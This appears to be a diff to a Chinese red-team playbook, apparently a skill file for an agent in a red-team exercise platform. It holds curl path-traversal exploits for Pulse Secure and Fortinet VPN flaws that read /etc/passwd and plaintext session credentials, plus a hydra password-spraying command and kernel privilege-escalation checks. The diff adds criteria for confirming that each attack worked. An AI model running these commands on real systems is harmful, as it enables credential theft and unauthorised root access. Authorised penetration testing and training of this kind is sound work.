@@ -255,12 +255,21 @@ fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码
 # Pulse Secure VPN（CVE-2019-11510）
 curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"
 
-# Fortinet VPN（CVE-2018-13379）
+# Fortinet VPN（CVE-2018-13379）—— 目标文件是会话库，里面是**明文凭据**
 curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
 
 # 通用：密码喷洒
 hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
 ```
+
+**验伤（这两条都极易「看着成功其实没有」）**：
+- **Pulse**：必须看到响应体里有 `root:x:0:0` 才算读到了 `/etc/passwd`。回 200 + 一堆 HTML
+  是登录页（补丁后就会这样），不是泄露。
+- **Fortinet**：`sslvpn_websession` 是**二进制/近似文本混排**，判据是响应体里出现
+  `host=`、`user=`、`pass=` 这类字段（明文账号密码）。**只看 HTTP 200 完全不够** ——
+  未打补丁也可能回 200 但只给一个空文件或 HTML。
+- 两个洞都进 KEV、都在野大规模扫描：**你打的时候别人也在打**，日志里早有痕迹，
+  不是「首发」就别在报告里当自己的发现写。
 
 ### 2.6 云服务突破
 
@@ -319,7 +328,11 @@ sudo find / -exec /bin/bash \;
 
 # 内核漏洞
 uname -r  # 检查版本
-# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)
+# DirtyPipe (CVE-2022-0847)：5.8 ≤ kernel < 5.16.11 / 5.15.25 / 5.10.102
+# DirtyCow (CVE-2016-5195)：< 4.8.3（老机器才有；新内核打不通是正常的）
+#   ⚠ 内核 exp 验伤只有一条：**提权后 `id` 回显 uid=0**。
+#   「exp 编译通过 / 没报错 / 打印了东西」全都不算 —— DirtyPipe 打已修补内核时
+#   会正常退出、什么都不改，看起来像"跑完了"。
 
 # 自动化检测
 ./linpeas.sh
@@ -703,17 +716,7 @@ second-shot:end -->
 落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
 **没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
 
-<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->
 
-## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）
-
-- **阶段**：流程/编排｜**角色**：`flow`
-- **下游**（产出交给谁）：`recon-pipeline`、`attack-traceability`
-- **互补**（同类场景一起用）：`browser-automation`、`case-review`
-- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`stage` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
-
-
-<!-- /skill-link-graph -->
 
 <!-- runnability:start scripts/inject-runnability.mjs 生成，勿手改 -->
 
@@ -736,3 +739,15 @@ second-shot:end -->
 命令含 Linux 专属形态（`sudo` / `apt` / `/usr/share` 等）：本机是 Windows，**去掉 sudo**、把绝对路径换成工具目录（`$DSH_HOME/redteam/toolkit/<name>/`），`.exe` 后缀别漏。
 
 runnability:end -->
+
+<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->
+
+## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）
+
+- **阶段**：流程/编排｜**角色**：`flow`
+- **下游**（产出交给谁）：`recon-pipeline`、`attack-traceability`
+- **互补**（同类场景一起用）：`browser-automation`、`case-review`
+- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`stage` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
+
+
+<!-- /skill-link-graph -->
